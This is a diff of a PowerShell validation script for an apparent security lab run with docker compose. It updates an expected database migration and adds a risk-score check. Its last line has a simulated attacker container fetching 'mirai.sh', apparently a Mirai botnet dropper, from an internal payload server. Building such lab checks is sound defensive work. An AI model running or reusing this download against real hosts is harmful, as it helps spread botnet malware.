@@ -47,7 +47,7 @@ Assert-LastExitCode "PostgreSQL no acepta conexiones."
 
 $migration = (& docker compose exec -T postgres psql -U oscorp -d oscorp -Atc "SELECT version_num FROM alembic_version;").Trim()
 Assert-LastExitCode "No se pudo consultar la migración Alembic."
-if ($migration -ne "0004_correlated_sessions") {
+if ($migration -ne "0005_session_risk_scores") {
     throw "Versión de migración inesperada: $migration"
 }
 
@@ -80,6 +80,8 @@ if ($worker.status -ne "ok" -or $worker.contract_version -ne "1.0") {
 Write-Host "[validate] Verificando pruebas Python..."
 & docker compose exec -T pipeline-worker python -m unittest discover -s /app/tests -v
 Assert-LastExitCode "Las pruebas Python no fueron superadas."
+
+& "$PSScriptRoot\validate_risk_scores.ps1" -CheckOnly
 
 Write-Host "[validate] Verificando payload interno..."
 $payload = & docker compose exec -T attacker-sim curl -fsS http://payload-server:8080/mirai.sh
